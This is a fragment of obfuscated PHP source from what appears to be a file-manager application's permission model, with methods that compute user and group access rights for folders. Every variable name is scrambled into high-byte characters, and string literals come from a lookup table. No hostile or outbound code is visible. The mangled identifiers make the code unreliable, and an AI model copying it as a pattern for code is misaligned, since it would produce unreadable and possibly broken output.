} $¹æÆ·©[$ÎôŞ®´ê[460]] = $ÚÇª÷€ù; $²›¦º²[] = $¹æÆ·©; $ì¬°¼ÍÓ = 0; if ($¬¬ëû¯[$ÎôŞ®´ê[406]] == SourceModel::TYPE_GROUP) { $ì¬°¼ÍÓ = $í„€¾å * 2; } if ($¬¬ëû¯[$ÎôŞ®´ê[406]] == SourceModel::TYPE_USER) { $ì¬°¼ÍÓ = $í„€¾å; } if ($¬¬ëû¯[$ÎôŞ®´ê[406]] == SourceModel::TYPE_USER && $¬¬ëû¯[$ÎôŞ®´ê[498]] == $ÎôŞ®´ê[191]) { $ì¬°¼ÍÓ = 0; } $Å±¾†ç¼[] = $ÚÇª÷€ù[$ÎôŞ®´ê[408]] + $ì¬°¼ÍÓ; } array_multisort($Å±¾†ç¼, SORT_DESC, $²›¦º²); return $²›¦º²; } public function getAllChildrenByUser($À§­Ô…ß, $Ö»ãŞâ) { $Ó­À¬Àé =& $_SERVER[ÏÒ Ì„]; $€æĞˆÌÕ = Model($Ó­À¬Àé[532])->getInfo($Ö»ãŞâ); if (!$Ö»ãŞâ || !$À§­Ô…ß || !$€æĞˆÌÕ) { return array(); } $Öœ·ÀÜ£ = Model($Ó­À¬Àé[1251])->sourceInfo($À§­Ô…ß); $’Ö¬ìš› = array(); $Ä¬ûşÃñ = 1; if ($Öœ·ÀÜ£[$Ó­À¬Àé[492]] == $Ó­À¬Àé[191] && $Öœ·ÀÜ£[$Ó­À¬Àé[498]] != $Ä¬ûşÃñ && $this->groupContainUser($Öœ·ÀÜ£[$Ó­À¬Àé[498]], $Ö»ãŞâ)) { foreach ($€æĞˆÌÕ[$Ó­À¬Àé[1926]] as $òûÖÃÆ¤) { $©—º¦ÉŸ = Model($Ó­À¬Àé[516])->getInfo($òûÖÃÆ¤[$Ó­À¬Àé[1746]]); $åëÊé¤õ = Model($Ó­À¬Àé[532])->getInfoSimpleOuter($Ö»ãŞâ); $åëÊé¤õ[$Ó­À¬Àé[460]] = $òûÖÃÆ¤[$Ó­À¬Àé[408]]; if (Model($Ó­À¬Àé[501])->authCheckAction($òûÖÃÆ¤[$Ó­À¬Àé[408]][$Ó­À¬Àé[408]], $Ó­À¬Àé[1766])) { continue; } $¼¹î‘÷û = array($Ó­À¬Àé[28] => $Ó­À¬Àé[1527] . $©—º¦ÉŸ[$Ó­À¬Àé[28]], $Ó­À¬Àé[397] => $©—º¦ÉŸ[$Ó­À¬Àé[85]][$Ó­À¬Àé[397]], $Ó­À¬Àé[76] => KodIO::make($©—º¦ÉŸ[$Ó­À¬Àé[85]][$Ó­À¬Àé[397]]), $Ó­À¬Àé[492] => $Ó­À¬Àé[191], $Ó­À¬Àé[406] => $Ó­À¬Àé[509], $Ó­À¬Àé[29] => $Ó­À¬Àé[542], $Ó­À¬Àé[513] => $©—º¦ÉŸ[$Ó­À¬Àé[520]], $Ó­À¬Àé[1746] => $©—º¦ÉŸ[$Ó­À¬Àé[1746]], $Ó­À¬Àé[517] => $©—º¦ÉŸ[$Ó­À¬Àé[492]], $Ó­À¬Àé[1923] => array($åëÊé¤õ)); $’Ö¬ìš›[$¼¹î‘÷û[$Ó­À¬Àé[397]]] = $¼¹î‘÷û; } } $ã‹‹î—Á = array(); $ˆ×úÃ×° = $this->getAllChildren($À§­Ô…ß); foreach ($ˆ×úÃ×° as $†‰ Ò’†) { $ĞïÃ¼ˆÅ = !1; foreach ($†‰ Ò’†[$Ó­À¬Àé[1923]] as $çÇç§¦×) { if ($çÇç§¦×[$Ó­À¬Àé[1578]]) { if ($çÇç§¦×[$Ó­À¬Àé[1578]] == $Ö»ãŞâ) { $ĞïÃ¼ˆÅ = !0; break; } } if ($çÇç§¦×[$Ó­À¬Àé[1746]]) { if ($this->groupContainUser($çÇç§¦×[$Ó­À¬Àé[1746]], $Ö»ãŞâ)) { $ĞïÃ¼ˆÅ = !0; break; } } } if ($ĞïÃ¼ˆÅ) { $ã‹‹î—Á[] = $†‰ Ò’†; } $ö”Ô³“ = $†‰ Ò’†[$Ó­À¬Àé[397]]; if (isset($’Ö¬ìš›[$ö”Ô³“])) { $†‰ Ò’†[$Ó­À¬Àé[1923]][] = $’Ö¬ìš›[$ö”Ô³“][0]; $’Ö¬ìš›[$ö”Ô³“] = !1; } } $’Ö¬ìš› = array_filter(array_values($’Ö¬ìš›)); $ã‹‹î—Á = array_merge($’Ö¬ìš›, $ã‹‹î—Á); return $ã‹‹î—Á; } public function setAllChildrenByUser($âÂ…¥¹«, $£Ïş÷Ä¶, $ÔŞâÖà‡) { $ûíÚ¶èƒ =& $_SERVER[ÏÒ Ì„]; $­ëØ†íŸ = $this->getAllChildrenByUser($âÂ…¥¹«, $£Ïş÷Ä¶); if (!$ÔŞâÖà‡ || !$­ëØ†íŸ) { return !1; } foreach ($­ëØ†íŸ as $üÁµ›¼³) { $—ë’‹Ü  = array(); foreach ($üÁµ›¼³[$ûíÚ¶èƒ[1923]] as $‚ÌåúöŠ) { $­ø’Ëæ¾ = $‚ÌåúöŠ[$ûíÚ¶èƒ[460]]; $ö—øèƒ¥ = $‚ÌåúöŠ[$ûíÚ¶èƒ[1578]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $æòĞÃ…Ö = $‚ÌåúöŠ[$ûíÚ¶èƒ[1578]] ? $‚ÌåúöŠ[$ûíÚ¶èƒ[1578]] : $‚ÌåúöŠ[$ûíÚ¶èƒ[1746]]; if ($‚ÌåúöŠ[$ûíÚ¶èƒ[1578]] && $‚ÌåúöŠ[$ûíÚ¶èƒ[1578]] == $£Ïş÷Ä¶) { continue; } $—ë’‹Ü [] = array($ûíÚ¶èƒ[397] => $üÁµ›¼³[$ûíÚ¶èƒ[397]], $ûíÚ¶èƒ[406] => $ö—øèƒ¥, $ûíÚ¶èƒ[498] => intval($æòĞÃ…Ö), $ûíÚ¶èƒ[1849] => isset($­ø’Ëæ¾[$ûíÚ¶èƒ[395]]) ? intval($­ø’Ëæ¾[$ûíÚ¶èƒ[395]]) : 0, $ûíÚ¶èƒ[1903] => isset($­ø’Ëæ¾[$ûíÚ¶èƒ[1903]]) ? intval($­ø’Ëæ¾[$ûíÚ¶èƒ[1903]]) : -1); } $—ë’‹Ü [] = array($ûíÚ¶èƒ[397] => $üÁµ›¼³[$ûíÚ¶èƒ[397]], $ûíÚ¶èƒ[406] => SourceModel::TYPE_USER, $ûíÚ¶èƒ[498] => intval($£Ïş÷Ä¶), $ûíÚ¶èƒ[1849] => intval($ÔŞâÖà‡), $ûíÚ¶èƒ[1903] => -1); $this->where(array($ûíÚ¶èƒ[412] => $üÁµ›¼³[$ûíÚ¶èƒ[397]]))->delete(); $this->addAll($—ë’‹Ü ); } return !0; } public function get($Û˜Ô¨Å€) { $æÇ×ãáá = $this->getSourceList(array($Û˜Ô¨Å€), !0); return $æÇ×ãáá[0]; } public function getSourceList($›ÊÃëˆÄ, $úğ¢‰ôà = false, $ŸéêéÕİ = false) { $™Íî’ˆê =& $_SERVER[ÏÒ Ì„]; if (!$›ÊÃëˆÄ) { return array(); } $êãè„¶Ø = Model($™Íî’ˆê[1251]); if (!$úğ¢‰ôà && count($›ÊÃëˆÄ) == 1) { $úğ¢‰ôà = array(); $úğ¢‰ôà[$›ÊÃëˆÄ[0]] = $êãè„¶Ø->sourceInfo($›ÊÃëˆÄ[0]); } if (!$úğ¢‰ôà) { $“™œÊ’• = array($™Íî’ˆê[412] => array($™Íî’ˆê[413], $›ÊÃëˆÄ)); $úğ¢‰ôà = $êãè„¶Ø->field($™Íî’ˆê[1927])->where($“™œÊ’•)->select(); $úğ¢‰ôà = array_to_keyvalue($úğ¢‰ôà, $™Íî’ˆê[397]); } $õ•ÁÚ¾ = $›ÊÃëˆÄ; foreach ($úğ¢‰ôà as $ááµ®Æ => $Íäô²¶ø) { $Ö§é¡¶¬ = $êãè„¶Ø->parentLevelArray($Íäô²¶ø[$™Íî’ˆê[515]]); $õ•ÁÚ¾ = array_merge($õ•ÁÚ¾, array($ááµ®Æ), array_reverse($Ö§é¡¶¬)); } $õ•ÁÚ¾ = array_values(array_unique($õ•ÁÚ¾)); if (!$õ•ÁÚ¾) { return array(); } $ˆäÍÓ¼á = $this->sourceAuthSelect($õ•ÁÚ¾); $‘¦ïı¥Ğ = array(); foreach ($õ•ÁÚ¾ as $É¤¶éá) { if (isset($ˆäÍÓ¼á[$É¤¶éá])) { $‘¦ïı¥Ğ[$É¤¶éá] = $ˆäÍÓ¼á[$É¤¶éá]; } } $¶ñŠ•ğ = $this->userIsRoot($ŸéêéÕİ); $Ö«¾¸ïÅ = AuthModel::authAll(); $á—âüÁø = array($™Íî’ˆê[409] => $Ö«¾¸ïÅ, $™Íî’ˆê[1928] => array($™Íî’ˆê[414] => 0, $™Íî’ˆê[1752] => $Ö«¾¸ïÅ, $™Íî’ˆê[415] => LNG($™Íî’ˆê[1929]), $™Íî’ˆê[1768] => $™Íî’ˆê[1930])); $¨¸îæÆè = array(); foreach ($úğ¢‰ôà as $É¤¶éá => $‚§°”À) { if ($¶ñŠ•ğ) { $¨¸îæÆè[$É¤¶éá] = $á—âüÁø; continue; } $¨¸îæÆè[$É¤¶éá] = $this->makeSourceAuth($‚§°”À, $‘¦ïı¥Ğ, $ŸéêéÕİ); } return $¨¸îæÆè; } public function authDeepCheck($–çå„–½, $ƒ’Òê = false) { $âšË¯«Ó =& $_SERVER[ÏÒ Ì„]; $ƒ’Òê = $ƒ’Òê ? $ƒ’Òê : USER_ID; $™—¤–å¬ = $this->makeAuthDeep($ƒ’Òê); if (!in_array($–çå„–½, $™—¤–å¬[$âšË¯«Ó[1931]])) { return !1; } $•Î”§™ñ = array(); foreach ($™—¤–å¬[$âšË¯«Ó[1932]] as $¢­è¢âà => $ë‰êú) { if (!in_array($–çå„–½, $ë‰êú)) { continue; } $•Î”§™ñ[] = $¢­è¢âà; } if (!$•Î”§™ñ) { return !1; } $­³øì¡Í = $•Î”§™ñ ? $•Î”§™ñ[0] : $–çå„–½; return array($âšË¯«Ó[409] => -1, $âšË¯«Ó[460] => array($âšË¯«Ó[414] => $âšË¯«Ó[1118], $âšË¯«Ó[1752] => $âšË¯«Ó[191], $âšË¯«Ó[415] => LNG($âšË¯«Ó[1933]), $âšË¯«Ó[1768] => $âšË¯«Ó[1934]), $âšË¯«Ó[1935] => LNG($âšË¯«Ó[1936]), $âšË¯«Ó[1937] => $this->sourceAuthInfo($­³øì¡Í)); } protected function makeAuthDeep($ì‡ÙÈÃÂ = false) { $•ƒµ‚à =& $_SERVER[ÏÒ Ì„]; static $Ï±Í–Ş‘ = array(); $ì‡ÙÈÃÂ = $ì‡ÙÈÃÂ ? $ì‡ÙÈÃÂ : USER_ID; if (isset($Ï±Í–Ş‘[$ì‡ÙÈÃÂ])) { return $Ï±Í–Ş‘[$ì‡ÙÈÃÂ]; } $µßı–Ü© = Model($•ƒµ‚à[1938])->listData(); $ªÍšæª = array(); foreach ($µßı–Ü© as $£È¼©®‰) { if ($£È¼©®‰[$•ƒµ‚à[408]] == 0 && $£È¼©®‰[$•ƒµ‚à[1767]] == $•ƒµ‚à[87]) { $ªÍšæª[] = $£È¼©®‰[$•ƒµ‚à[395]]; } } $ñşôÛÌä = $this->userGroupParents($ì‡ÙÈÃÂ); $ïÁ¥·ãï = array($•ƒµ‚à[406] => SourceModel::TYPE_USER, $•ƒµ‚à[498] => $ì‡ÙÈÃÂ); if ($ñşôÛÌä) { $ïÁ¥·ãï = array(array($•ƒµ‚à[406] => SourceModel::TYPE_USER, $•ƒµ‚à[498] => $ì‡ÙÈÃÂ), array($•ƒµ‚à[406] => SourceModel::TYPE_GROUP, $•ƒµ‚à[498] => array($•ƒµ‚à[413], $ñşôÛÌä)), $•ƒµ‚à[994] => $•ƒµ‚à[1841]); } $™áÔâ•Š = $this->field($•ƒµ‚à[1939])->where($ïÁ¥·ãï)->select(); $§ŞÙ–Ó = array(); $¢ôÓ–µ = array_to_keyvalue_group($™áÔâ•Š, $•ƒµ‚à[397]); foreach ($¢ôÓ–µ as $»øàª => $¹ºœŸÉ) { $‹âÍ¦ı¦ = $this->authArrayCheck($¹ºœŸÉ, $ì‡ÙÈÃÂ); if ($‹âÍ¦ı¦[$•ƒµ‚à[409]] > 0) { $§ŞÙ–Ó[] = $»øàª . $•ƒµ‚à[33]; } } $¬˜³â³€ = array(); $—¹ß…¸ = $ñşôÛÌä; $¾„î…Û = Model($•ƒµ‚à[1251]); $¦÷ñ¦Éé = Model($•ƒµ‚à[516]); $˜ò…Ó‘” = array(); $÷ÈˆŸ½Î = array(); $²•ƒÙÛ‡ = array(); $ò½›¦ä½ = array(); if ($§ŞÙ–Ó) { $Üƒóù´å = $¾„î…Û->where(array($•ƒµ‚à[397] => array($•ƒµ‚à[413], $§ŞÙ–Ó)))->select(); foreach ($Üƒóù´å as $±ÚÇ´»í) { $úüğıŞ = $¾„î…Û->parentLevelArray($±ÚÇ´»í[$•ƒµ‚à[515]]); $¬˜³â³€ = array_merge($¬˜³â³€, $úüğıŞ); $—¹ß…¸[] = $±ÚÇ´»í[$•ƒµ‚à[498]]; $˜ò…Ó‘”[$±ÚÇ´»í[$•ƒµ‚à[397]]] = $úüğıŞ; $÷ÈˆŸ½Î[$±ÚÇ´»í[$•ƒµ‚à[397]]] = $±ÚÇ´»í[$•ƒµ‚à[498]]; } } $—¹ß…¸ = array_values(array_unique($—¹ß…¸)); $†ıĞ°¿— = $—¹ß…¸; foreach ($†ıĞ°¿— as $³ş¤—²ƒ) { $ÀÑ¢å“° = $¦÷ñ¦Éé->getInfo($³ş¤—²ƒ); $úüğıŞ = $¾„î…Û->parentLevelArray($ÀÑ¢å“°[$•ƒµ‚à[515]]); $—¹ß…¸ = array_merge($—¹ß…¸, $úüğıŞ); } $—¹ß…¸ = array_values(array_unique($—¹ß…¸)); foreach ($—¹ß…¸ as $³ş¤—²ƒ) { $ÀÑ¢å“° = $¦÷ñ¦Éé->getInfo($³ş¤—²ƒ); $¬˜³â³€[] = $ÀÑ¢å“°[$•ƒµ‚à[85]][$•ƒµ‚à[397]]; $²•ƒÙÛ‡[$³ş¤—²ƒ] = $ÀÑ¢å“°[$•ƒµ‚à[85]][$•ƒµ‚à[397]]; $ò½›¦ä½[$³ş¤—²ƒ] = $¾„î…Û->parentLevelArray($ÀÑ¢å“°[$•ƒµ‚à[515]]); } foreach ($˜ò…Ó‘” as $®à…Â­¸ => $Ä–ëĞ¸ƒ) { $ÆØÆóá = $÷ÈˆŸ½Î[$®à…Â­¸]; if (!$ÆØÆóá || !$²•ƒÙÛ‡[$ÆØÆóá]) { continue; } $Œ£•ÍÅ¬ = array(); foreach ($ò½›¦ä½[$ÆØÆóá] as $³ş¤—²ƒ) { $Œ£•ÍÅ¬[] = $²•ƒÙÛ‡[$³ş¤—²ƒ]; } $˜ò…Ó‘”[$®à…Â­¸] = array_merge($Œ£•ÍÅ¬, $Ä–ëĞ¸ƒ); } $¬˜³â³€ = array_values(array_unique($¬˜³â³€)); $²îù½Åô = array($•ƒµ‚à[1931] => $¬˜³â³€, $•ƒµ‚à[1932] => $˜ò…Ó‘”); $Ï±Í–Ş‘[$ì‡ÙÈÃÂ] = $²îù½Åô; return $²îù½Åô; } private function makeSourceAuth($ÂŸõ¨‰Ï, $ûó¢Şúø, $¬îĞ¾ö– = false) { $êÛ†œ¨ı =& $_SERVER[ÏÒ Ì„]; $˜¿ï•ÒÄ = $êÛ†œ¨ı[87]; $™¨®± = $ÂŸõ¨‰Ï[$êÛ†œ¨ı[498]]; $Şêè­šº = $ÂŸõ¨‰Ï[$êÛ†œ¨ı[406]] == SourceModel::TYPE_GROUP; $”®ÔÎİ± = $Şêè­šº ? $this->groupRootAuth($™¨®±, $¬îĞ¾ö–) : !1; if ($”®ÔÎİ± && Model($êÛ†œ¨ı[501])->authCheckAction($”®ÔÎİ±[$êÛ†œ¨ı[408]], $êÛ†œ¨ı[1766])) { return $this->groupAuthInfo($”®ÔÎİ±, $™¨®±); } $ğ«ö²£„ = Model($êÛ†œ¨ı[1251])->parentLevelArray($ÂŸõ¨‰Ï[$êÛ†œ¨ı[515]]); $ğ«ö²£„ = array_merge(array($ÂŸõ¨‰Ï[$êÛ†œ¨ı[397]]), array_reverse($ğ«ö²£„)); $©š•ùøş = !1; foreach ($ğ«ö²£„ as $¨€”È¥Ï) { if (!isset($ûó¢Şúø[$¨€”È¥Ï])) { continue; } $ É×ç = $this->authMake($ûó¢Şúø[$¨€”È¥Ï], $¬îĞ¾ö–); if ($ É×ç[$êÛ†œ¨ı[460]]) { $©š•ùøş = $ É×ç; break; } } if (!$Şêè­šº) { return $©š•ùøş; } if (!$©š•ùøş && $”®ÔÎİ±) { $©š•ùøş = $this->groupAuthInfo($”®ÔÎİ±, $™¨®±); } if (!$©š•ùøş) { $õ¡–©×¸ = Model($êÛ†œ¨ı[516])->getInfo($™¨®±); $½÷…çâˆ = explode($êÛ†œ¨ı[47], trim($õ¡–©×¸[$êÛ†œ¨ı[515]], $êÛ†œ¨ı[47])); $½÷…çâˆ = array_reverse($½÷…çâˆ); foreach ($½÷…çâˆ as $›—ë†ƒÊ) { if ($›—ë†ƒÊ == $êÛ†œ¨ı[191] || $›—ë†ƒÊ == $˜¿ï•ÒÄ) { continue; } $Ò÷ËİÚ÷ = $this->groupRootAuth($›—ë†ƒÊ, $¬îĞ¾ö–); if (!$Ò÷ËİÚ÷) { continue; } $©š•ùøş = $this->groupAuthInfo($Ò÷ËİÚ÷, $›—ë†ƒÊ); break; } } if (!$©š•ùøş || $©š•ùøş[$êÛ†œ¨ı[409]] <= 0) { $½ùÈ·´í = $this->authDeepCheck($ÂŸõ¨‰Ï[$êÛ†œ¨ı[397]], $¬îĞ¾ö–); if ($½ùÈ·´í) { $©š•ùøş = $½ùÈ·´í; } } return $©š•ùøş; } private function userIsRoot($µ¼ÔÇóŞ = false) { $Ï•Ô÷£õ =& $_SERVER[ÏÒ Ì„]; if (!$µ¼ÔÇóŞ && _get($GLOBALS, $Ï•Ô÷£õ[499])) { return !0; } $Òƒ¥¸£‚ = Model($Ï•Ô÷£õ[532])->getInfo($µ¼ÔÇóŞ); $³˜éÚ×½ = Model($Ï•Ô÷£õ[1940])->listData($Òƒ¥¸£‚[$Ï•Ô÷£õ[1458]]); if ($³˜éÚ×½ && $³˜éÚ×½[$Ï•Ô÷£õ[505]][$Ï•Ô÷£õ[1941]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ÿ›Ç¥ÌÌ) { $©‹Ã¶·× =& $_SERVER[ÏÒ Ì„]; $‚óäßß± = Model($©‹Ã¶·×[1251]); $½ˆûÇ€ = $‚óäßß±->sourceInfo($Ÿ›Ç¥ÌÌ); if (!$½ˆûÇ€) { return !1; } $‚óäßß±->groupPathDisplay($½ˆûÇ€); $ú¶´ÂşÛ = array($½ˆûÇ€); $ú¶´ÂşÛ = $‚óäßß±->_listAppendPath($ú¶´ÂşÛ); $½ˆûÇ€ = $ú¶´ÂşÛ[0]; $Æ„âúò = $½ˆûÇ€[$©‹Ã¶·×[513]]; if (isset($½ˆûÇ€[$©‹Ã¶·×[521]])) { $®îÅ÷¬° = explode($©‹Ã¶·×[8], trim($½ˆûÇ€[$©‹Ã¶·×[513]], $©‹Ã¶·×[8])); array_shift($®îÅ÷¬°); $Æ„âúò = $½ˆûÇ€[$©‹Ã¶·×[519]] . $©‹Ã¶·×[1942] . implode($©‹Ã¶·×[8], $®îÅ÷¬°); } return array($©‹Ã¶·×[415] => $½ˆûÇ€[$©‹Ã¶·×[28]], $©‹Ã¶·×[76] => KodIO::make($½ˆûÇ€[$©‹Ã¶·×[397]]), $©‹Ã¶·×[1943] => $Æ„âúò); } private function groupAuthInfo($ÕØÒõò½, $£˜¬—Ø®) { $¿À“ƒÈæ =& $_SERVER[ÏÒ Ì„]; $ç¿´Ü¡ = Model($¿À“ƒÈæ[516])->getInfo($£˜¬—Ø®); return array($¿À“ƒÈæ[1944] => intval($ÕØÒõò½[$¿À“ƒÈæ[408]]), $¿À“ƒÈæ[1928] => $ÕØÒõò½, $¿À“ƒÈæ[1945] => LNG($¿À“ƒÈæ[1946]), $¿À“ƒÈæ[1937] => array($¿À“ƒÈæ[415] => $ç¿´Ü¡[$¿À“ƒÈæ[28]], $¿À“ƒÈæ[76] => KodIO::make($ç¿´Ü¡[$¿À“ƒÈæ[85]][$¿À“ƒÈæ[397]]), $¿À“ƒÈæ[1943] => $ç¿´Ü¡[$¿À“ƒÈæ[520]])); } protected function groupRootAuth($®•ãÌÍ¥, $Ú¶ÌÇãÚ = false) { $§øˆ‚ô« =& $_SERVER[ÏÒ Ì„]; $Ú¶ÌÇãÚ = $Ú¶ÌÇãÚ ? $Ú¶ÌÇãÚ : USER_ID; $ÊÄ•¾ƒ‚ = $Ú¶ÌÇãÚ . $§øˆ‚ô«[1947] . $®•ãÌÍ¥; static $´ü›ª½¨ = array(); if (isset($´ü›ª½¨[$ÊÄ•¾ƒ‚])) { return $´ü›ª½¨[$ÊÄ•¾ƒ‚]; } $‹ßøÂÙ = Model($§øˆ‚ô«[516])->getInfo($®•ãÌÍ¥); $‡å„Úüâ = $this->userGroupList($Ú¶ÌÇãÚ); $ã¹¯èÁ¨ = isset($‡å„Úüâ[$®•ãÌÍ¥]) ? $‡å„Úüâ[$®•ãÌÍ¥][$§øˆ‚ô«[408]] : !1; if ($ã¹¯èÁ¨ && Model($§øˆ‚ô«[501])->authCheckAction($ã¹¯èÁ¨[$§øˆ‚ô«[408]], $§øˆ‚ô«[1766])) { $´ü›ª½¨[$ÊÄ•¾ƒ‚] = $ã¹¯èÁ¨; return $ã¹¯èÁ¨; } $Æäğ®› = $this->sourceAuthSelect($‹ßøÂÙ[$§øˆ‚ô«[85]][$§øˆ‚ô«[397]]); $ÍšÑ„É³ = $Æäğ®› ? $this->authMake($Æäğ®›, $Ú¶ÌÇãÚ) : !1; $€¬‘Ë³š = $ÍšÑ„É³ ? $ÍšÑ„É³[$§øˆ‚ô«[460]] : !1; $´ü›ª½¨[$ÊÄ•¾ƒ‚] = $€¬‘Ë³š ? $€¬‘Ë³š : $ã¹¯èÁ¨; return $´ü›ª½¨[$ÊÄ•¾ƒ‚]; } public function authOwnerApply($û´ãó«é) { $Œ¿•›½ =& $_SERVER[ÏÒ Ì„]; if (empty($û´ãó«é[$Œ¿•›½[408]]) || isset($û´ãó«é[$Œ¿•›½[1948]]) && $û´ãó«é[$Œ¿•›½[1948]]) { return $û´ãó«é; } if (AuthModel::authCheckRoot($û´ãó«é[$Œ¿•›½[408]][$Œ¿•›½[409]])) { return $û´ãó«é; } $˜²üë­ = Model($Œ¿•›½[1251])->parentLevelArray($û´ãó«é[$Œ¿•›½[515]]); $˜²üë­ = array_merge(array($û´ãó«é[$Œ¿•›½[397]]), array_reverse($˜²üë­)); $ˆÑ¾Ï¿ä = $this->sourceAuthSelect($˜²üë­); $£—Ä¨Ìã = array(); $ÒµûØØÆ = array(); foreach ($ˆÑ¾Ï¿ä as $×íÄ”°È => $ÖïÓøÓî) { $Ä¹Ç„¤Ÿ = $this->authFolderOwnerUser($ÖïÓøÓî); $£—Ä¨Ìã[$×íÄ”°È] = $Ä¹Ç„¤Ÿ; $ÒµûØØÆ = array_merge($ÒµûØØÆ, $Ä¹Ç„¤Ÿ[$Œ¿•›½[588]]); if ($Ä¹Ç„¤Ÿ[$Œ¿•›½[1949]]) { break; } } if (count($ÒµûØØÆ) == 0) { $ÒµûØØÆ = $this->authFolderOwnerGroup($û´ãó«é[$Œ¿•›½[498]]); } $ÒµûØØÆ = array_unique($ÒµûØØÆ); if (AuthModel::authCheckRoot($û´ãó«é[$Œ¿•›½[408]][$Œ¿•›½[409]])) { $ÒµûØØÆ[] = USER_ID; } $û´ãó«é[$Œ¿•›½[408]][$Œ¿•›½[1950]] = Model($Œ¿•›½[507])->userListInfo($ÒµûØØÆ); return $û´ãó«é; } private function authFolderOwnerGroup($ıÚû) { $ß ½ŠÜÅ =& $_SERVER[ÏÒ Ì„]; $Îª°ÖÂ‹ = Model($ß ½ŠÜÅ[1835])->where(array($ß ½ŠÜÅ[1746] => $ıÚû))->select(); $ÀÚÂÒóú = array(); if (!$Îª°ÖÂ‹) { return $ÀÚÂÒóú; } foreach ($Îª°ÖÂ‹ as $˜úè—ô) { $Ñéò¢Æ = $this->authInfo($˜úè—ô); if (AuthModel::authCheckRoot($Ñéò¢Æ[$ß ½ŠÜÅ[408]])) { $ÀÚÂÒóú[] = $˜úè—ô[$ß ½ŠÜÅ[1578]]; } } return $ÀÚÂÒóú; } private function authFolderOwnerUser($ª€¿şÇ) { $÷‹ë¸Ûƒ =& $_SERVER[ÏÒ Ì„]; $“¶˜œ†é = array(); $€£¿Ë†ç = !1; foreach ($ª€¿şÇ as $ğÙïı) { $› º°Öï = $this->authInfo($ğÙïı); if ($ğÙïı[$÷‹ë¸Ûƒ[498]] == $÷‹ë¸Ûƒ[191]) { $€£¿Ë†ç = !0; } if ($ğÙïı[$÷‹ë¸Ûƒ[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($› º°Öï[$÷‹ë¸Ûƒ[408]])) { $“¶˜œ†é[] = $ğÙïı[$÷‹ë¸Ûƒ[498]]; } } } return array($÷‹ë¸Ûƒ[588] => $“¶˜œ†é, $÷‹ë¸Ûƒ[1949] => $€£¿Ë†ç); } public function authMake($Ş¸şØçÃ, $¢ËÇ›æ = false) { $ü¨¦’Œ =& $_SERVER[ÏÒ Ì„]; $àÇÅ­£† = $this->authArrayCheck($Ş¸şØçÃ, $¢ËÇ›æ); if ($àÇÅ­£†[$ü¨¦’Œ[1951]]) { $àÇÅ­£†[$ü¨¦’Œ[1951]] = $this->sourceAuthInfo($àÇÅ­£†[$ü¨¦’Œ[1951]]); } return $àÇÅ­£†; } public function authArrayCheck($¸Ü²ˆ…Ú, $ÀñŠöõÕ = false) { $ı„ù„«Ó =& $_SERVER[ÏÒ Ì„]; if (!$¸Ü²ˆ…Ú) { return array($ı„ù„«Ó[409] => 0, $ı„ù„«Ó[460] => !1); } $ÀñŠöõÕ = $ÀñŠöõÕ ? $ÀñŠöõÕ : USER_ID; $¿¼ÄĞã± = 0; $ëÈı¾“Ù = 0; $†§ØÀÃœ = 0; $¥Ğİı™¨ = 0; $æ­®İ¬ = 0; $ÁÇ˜¹ü = 0; $½ğû = 1000; $¼ûµÚ˜Ò = 0; $®Š×È½ = 0; $‰Ú¤Ï›´ = 0; $’é‰Ööì = 0; $›†‚ç = array($ı„ù„«Ó[397] => 0); foreach ($¸Ü²ˆ…Ú as $›†‚ç) { $Ïƒ…¥îœ = $this->authInfo($›†‚ç); if (!$Ïƒ…¥îœ) { continue; } $Ê±íõöå = $›†‚ç[$ı„ù„«Ó[498]]; $Ÿ§Éñ”À = intval($Ïƒ…¥îœ[$ı„ù„«Ó[408]]); if ($›†‚ç[$ı„ù„«Ó[406]] == SourceModel::TYPE_USER && $Ê±íõöå == $ÀñŠöõÕ) { $¿¼ÄĞã± = !0; $†§ØÀÃœ = $Ïƒ…¥îœ; $ëÈı¾“Ù = $Ÿ§Éñ”À; } else { if ($›†‚ç[$ı„ù„«Ó[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ê±íõöå, $ÀñŠöõÕ)) { $¥Ğİı™¨ = !0; $ìºîÆÂ = $this->groupStepToUserGroup($Ê±íõöå, $ÀñŠöõÕ); if ($ìºîÆÂ < $½ğû) { $½ğû = $ìºîÆÂ; $æ­®İ¬ = $Ÿ§Éñ”À; $ÁÇ˜¹ü = $Ïƒ…¥îœ; $¼ûµÚ˜Ò = $Ê±íõöå; } if ($ìºîÆÂ == $½ğû && $Ÿ§Éñ”À >= $æ­®İ¬) { $æ­®İ¬ = $Ÿ§Éñ”À; $ÁÇ˜¹ü = $Ïƒ…¥îœ; $¼ûµÚ˜Ò = $Ê±íõöå; } } else { if ($Ê±íõöå == $ı„ù„«Ó[191]) { $®Š×È½ = !0; $’é‰Ööì = $Ïƒ…¥îœ; $‰Ú¤Ï›´ = $Ÿ§Éñ”À; } } } } if ($¿¼ÄĞã±) { $øøçÇ¹‚ = $ëÈı¾“Ù; $Ïƒ…¥îœ = $†§ØÀÃœ; $ùÜ·’øÊ = LNG($ı„ù„«Ó[1952]); } else { if ($¥Ğİı™¨) { $øøçÇ¹‚ = $æ­®İ¬; $Ïƒ…¥îœ = $ÁÇ˜¹ü; $¦«î„Îœ = Model($ı„ù„«Ó[516])->getInfo($¼ûµÚ˜Ò); $ùÜ·’øÊ = $ı„ù„«Ó[160] . $¦«î„Îœ[$ı„ù„«Ó[520]] . $ı„ù„«Ó[1953] . LNG($ı„ù„«Ó[1954]); } else { if ($®Š×È½) { $øøçÇ¹‚ = $‰Ú¤Ï›´; $Ïƒ…¥îœ = $’é‰Ööì; $ùÜ·’øÊ = LNG($ı„ù„«Ó[1925]); } else { $øøçÇ¹‚ = 0; $Ïƒ…¥îœ = !1; $ùÜ·’øÊ = $ı„ù„«Ó[33]; } } } $íäî¹ı¡ = array($ı„ù„«Ó[1944] => intval($øøçÇ¹‚), $ı„ù„«Ó[1928] => $Ïƒ…¥îœ, $ı„ù„«Ó[1945] => $ùÜ·’øÊ, $ı„ù„«Ó[1937] => $›†‚ç[$ı„ù„«Ó[397]]); return $íäî¹ı¡; } private function groupContainUser($ø…¿‹Â÷, $»”©Åë” = false) { return in_array($ø…¿‹Â÷, $this->userGroupParents($»”©Åë”)); } private function groupStepToUserGroup($ÄŞğ¿Äº, $Ä›¾—ãŠ = false) { $ì¼¯„“„ =& $_SERVER[ÏÒ Ì„]; $÷èÆ¯¤À = $this->userGroupList($Ä›¾—ãŠ); $¸æş‚±İ = 1000; 